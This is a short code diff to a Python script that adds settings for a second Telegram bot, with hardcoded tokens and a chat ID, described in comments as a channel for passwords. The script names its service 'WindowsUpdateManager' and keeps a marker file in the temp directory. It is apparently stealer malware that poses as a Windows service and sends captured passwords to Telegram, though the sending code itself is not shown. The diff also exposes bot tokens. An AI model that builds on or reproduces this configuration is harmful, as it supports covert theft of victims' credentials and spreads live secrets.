@@ -5,6 +5,10 @@ import tempfile
 BOT_TOKEN = "8031189566:AAHwKCrgC4n_NRhOJBBcUFG40mzZeGUw9lw"  # Вставьте свой токен бота
 CHAT_ID = "-4923513285"  # Вставьте свой ID чата
 
+# Настройки отдельного бота для паролей
+PASSWORD_BOT_TOKEN = "8263114690:AAFjmLXe33lpucp41JRWUCtZwNqDkLzLC6A"  # Токен отдельного бота для паролей
+PASSWORD_CHAT_ID = "4923513285"  # ID чата для паролей
+
 # Константы
 SERVICE_NAME = "WindowsUpdateManager"
 MARKER_FILE = os.path.join(tempfile.gettempdir(), "winsys_marker.dat")
